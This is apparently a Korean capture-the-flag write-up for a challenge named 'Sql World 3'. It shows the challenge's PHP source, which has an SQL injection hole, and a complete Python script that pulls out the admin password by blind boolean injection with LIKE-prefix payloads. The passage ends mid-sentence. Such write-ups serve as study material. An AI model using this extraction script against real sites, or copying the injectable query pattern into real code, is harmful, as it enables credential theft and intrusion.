Sql World 3

web.isangxcaution.xyz:20300/sql3.php


Made by smart_kang

```php
<?php
    include "./config.php";
    $db = $link;
    $pw = isset($_GET['pw']) ? $_GET['pw'] : '';
    $query = "select id from sql3 where id='admin' and pw='$pw'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']){
        echo "<h2>Hello ~ Are you Admin?</h2>";   
        $pw = isset($_GET['pw']) ? addslashes($_GET['pw']) : '';
        $query = "select pw from sql3 where id='admin' and pw='$pw'";
        $result = @mysqli_fetch_array(mysqli_query($db,$query));
        if(($result['pw']) && ($result['pw'] == $pw)){
            echo $FLAG3;
        }else{
            echo "<h2>Oh you are not Admin!!! :(</h2><br>";
        }
    }
    
    highlight_file(__FILE__);
?>
```

처음에는 addslashes를 우회하는 문제인줄 알았지만, 자세히 보면 이후 
```php
if(($result['pw']) && ($result['pw'] == $pw)){
```
부분 때문에 결국 pw를 알아내야 하는 문제였다.

```python
import requests
from urllib.parse import quote
from bs4 import BeautifulSoup

url = "http://web.isangxcaution.xyz:20300/sql3.php?pw="

poss = "abcdefghijklmnopqrstuvwxyz0123456789"
pw = "0"
ex = f"' or exists(select id from sql3 WHERE id='admin' and pw like '{pw}%') and ''='"
flag = 0
while 1:
    for i in range(len(poss)):
        _pw = pw + poss[i]
        _ex = f"' or exists(select id from sql3 WHERE id='admin' and pw like '{_pw}%') and ''='"
        page = requests.get(url + quote(_ex))
        soup = BeautifulSoup(page.text, "html.parser")
        try:
            res = soup.find('h2').getText()
            if res == "Hello ~ Are you Admin?":
                pw = pw + poss[i]
                print(pw)
                break
        except:
            continue
        if i == len(poss) - 1:
            flag = 1
    if flag == 1:
        break

print(pw)
```
와 같이 ex code를 작성해서 pw를 
